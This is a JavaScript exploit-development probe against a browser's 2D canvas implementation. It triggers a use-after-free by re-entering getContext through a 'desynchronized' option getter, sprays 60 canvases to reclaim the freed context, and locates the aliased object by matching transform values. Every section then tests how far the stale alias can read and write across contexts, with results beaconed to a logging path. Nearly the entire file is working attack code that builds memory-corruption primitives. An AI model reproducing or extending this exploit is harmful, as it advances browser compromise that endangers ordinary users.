// CRASH_CLASS: LOW
// PROBE p554d: Same-type alias deep mapping
//
// Cross-type (AB→Canvas2D) is dead — different bmalloc size classes.
// Focus: exploit same-type R/W alias for all it's worth.
//
// Tests:
//   A) inner.canvas — which canvas does the context think it belongs to?
//   B) save() depth — how many saves before crash/OOM?
//   C) Drawing through alias — fillRect via stale, getImageData via spray
//   D) fillStyle/strokeStyle object references across alias
//   E) Gradient/pattern creation through alias

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');
  var retained = [];

  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P554D-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(msg.slice(0, 350));
    } catch (e) {}
  }

  emit('START', 'sametype-deep');

  // ===================== UAF + same-type reclaim =====================
  var canvas = document.createElement('canvas');
  canvas.width = 10; canvas.height = 10;
  canvas.id = 'original';
  document.body.appendChild(canvas);
  retained.push(canvas);

  var inner = null;
  var g = 0;
  var opts = {};
  Object.defineProperty(opts, 'desynchronized', {
    get: function () { g++; if (g === 1) { inner = canvas.getContext('2d'); } return false; },
    enumerable: true
  });

  var outer = canvas.getContext('2d', opts);
  retained.push(outer, inner);
  if (!inner || outer === inner) { emit('PATCHED', 'no UAF'); return; }
  emit('TRIGGER', 'ok');

  var SPRAY = 60;
  var sprayCanvases = [];
  var sprayCtx = [];
  for (var i = 0; i < SPRAY; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    c.id = 'spray' + i;
    var ctx = c.getContext('2d');
    if (ctx) {
      ctx.setTransform(11.11, 0, 0, 11.11, 0, 0);
      sprayCanvases.push(c);
      sprayCtx.push(ctx);
      retained.push(c, ctx);
    }
  }
  emit('SPRAYED', 'n=' + sprayCtx.length);

  var m = null;
  try { m = inner.getTransform(); } catch (e) { emit('ERR', String(e)); return; }
  if (!m || Math.abs(m.a - 11.11) > 0.01) {
    emit('NO-RECLAIM', 'a=' + (m ? m.a : 'null'));
    return;
  }

  // Find alias
  inner.setTransform(42.42, 0, 0, 42.42, 0, 0);
  var aliasIdx = -1;
  for (var j = 0; j < sprayCtx.length; j++) {
    try {
      var sm = sprayCtx[j].getTransform();
      if (sm && Math.abs(sm.a - 42.42) < 0.01) { aliasIdx = j; break; }
    } catch (e) {}
  }

  if (aliasIdx < 0) { emit('NO-ALIAS', 'could not find aliased canvas'); return; }
  var alias = sprayCtx[aliasIdx];
  var aliasCanvas = sprayCanvases[aliasIdx];
  emit('ALIAS', 'spray[' + aliasIdx + ']');

  // ===================== A) Canvas identity =====================
  try {
    var innerCanvas = inner.canvas;
    var aliasCanvasRef = alias.canvas;
    emit('CANVAS-ID',
      'inner.canvas.id=' + (innerCanvas ? innerCanvas.id : 'null') +
      ' alias.canvas.id=' + (aliasCanvasRef ? aliasCanvasRef.id : 'null') +
      ' sameAsOriginal=' + (innerCanvas === canvas) +
      ' sameAsSpray=' + (innerCanvas === aliasCanvas) +
      ' aliasIsSpray=' + (aliasCanvasRef === aliasCanvas));
  } catch (e) {
    emit('CANVAS-ID-ERR', String(e));
  }

  // ===================== B) save() depth test =====================
  var saveDepth = 0;
  try {
    for (var si = 0; si < 50; si++) {
      inner.save();
      saveDepth++;
    }
    emit('SAVE-OK', 'depth=' + saveDepth);
    for (var ri = 0; ri < saveDepth; ri++) { inner.restore(); }
    emit('RESTORE-OK', 'all restored');
  } catch (e) {
    emit('SAVE-ERR', 'crashed at depth ' + saveDepth + ': ' + e);
  }

  // ===================== C) Draw through alias =====================
  // Draw via stale inner, read pixels from alias canvas
  try {
    inner.setTransform(1, 0, 0, 1, 0, 0);
    inner.fillStyle = '#ff0000';
    inner.fillRect(0, 0, 5, 5);

    // Read pixels from the alias canvas (should show red if drawing crossed)
    var pixels = alias.getImageData(2, 2, 1, 1);
    var r = pixels.data[0], g2 = pixels.data[1], b = pixels.data[2], a = pixels.data[3];
    emit('DRAW-CROSS', 'inner.fillRect → alias.getImageData: rgba=' + r + ',' + g2 + ',' + b + ',' + a);

    // Also read from original canvas
    var outerPixels = outer.getImageData(2, 2, 1, 1);
    emit('DRAW-ORIG', 'outer.getImageData: rgba=' + outerPixels.data[0] + ',' +
      outerPixels.data[1] + ',' + outerPixels.data[2] + ',' + outerPixels.data[3]);

    // Read from inner too
    var innerPixels = inner.getImageData(2, 2, 1, 1);
    emit('DRAW-INNER', 'inner.getImageData: rgba=' + innerPixels.data[0] + ',' +
      innerPixels.data[1] + ',' + innerPixels.data[2] + ',' + innerPixels.data[3]);
  } catch (e) {
    emit('DRAW-ERR', String(e));
  }

  // ===================== D) fillStyle object identity =====================
  try {
    var grad = alias.createLinearGradient(0, 0, 10, 10);
    grad.addColorStop(0, '#00ff00');
    grad.addColorStop(1, '#0000ff');
    alias.fillStyle = grad;

    // Read through stale
    var staleStyle = inner.fillStyle;
    emit('STYLE-ALIAS', 'alias set gradient, inner reads: type=' + typeof staleStyle +
      ' value=' + String(staleStyle).slice(0, 60) +
      ' isGrad=' + (staleStyle === grad));
  } catch (e) {
    emit('STYLE-ERR', String(e));
  }

  // ===================== E) Gradient/pattern via stale =====================
  try {
    var grad2 = inner.createLinearGradient(0, 0, 5, 5);
    grad2.addColorStop(0, '#ff00ff');
    grad2.addColorStop(1, '#ffff00');
    inner.fillStyle = grad2;
    inner.fillRect(5, 5, 5, 5);

    var pix2 = alias.getImageData(7, 7, 1, 1);
    emit('GRAD-CROSS', 'inner.gradient→fillRect, alias reads: rgba=' +
      pix2.data[0] + ',' + pix2.data[1] + ',' + pix2.data[2] + ',' + pix2.data[3]);
  } catch (e) {
    emit('GRAD-ERR', String(e));
  }

  // ===================== F) Pattern from Image =====================
  try {
    var patCanvas = document.createElement('canvas');
    patCanvas.width = 2; patCanvas.height = 2;
    var patCtx = patCanvas.getContext('2d');
    patCtx.fillStyle = '#00ffff';
    patCtx.fillRect(0, 0, 2, 2);

    var pat = inner.createPattern(patCanvas, 'repeat');
    emit('PATTERN', 'created=' + !!pat + ' type=' + typeof pat);

    if (pat) {
      inner.fillStyle = pat;
      inner.fillRect(0, 5, 5, 5);
      var pix3 = alias.getImageData(2, 7, 1, 1);
      emit('PAT-CROSS', 'inner.pattern→fillRect, alias reads: rgba=' +
        pix3.data[0] + ',' + pix3.data[1] + ',' + pix3.data[2] + ',' + pix3.data[3]);
    }
  } catch (e) {
    emit('PATTERN-ERR', String(e));
  }

  // ===================== G) toDataURL through alias =====================
  try {
    var url1 = aliasCanvas.toDataURL();
    emit('DATAURL', 'len=' + url1.length + ' prefix=' + url1.slice(0, 30));
  } catch (e) {
    emit('DATAURL-ERR', String(e));
  }

  // ===================== H) measureText for heap alloc probing =====================
  try {
    inner.font = '48px serif';
    var tm1 = inner.measureText('AAAA');
    var tm2 = inner.measureText('WWWW');
    emit('FONT', 'font=48px_serif A4w=' + tm1.width + ' W4w=' + tm2.width);

    // Read font through alias
    emit('FONT-ALIAS', 'alias.font=' + alias.font);
  } catch (e) {
    emit('FONT-ERR', String(e));
  }

  emit('ALIVE', 'all tests completed');
  window.__p554d = retained;
})();
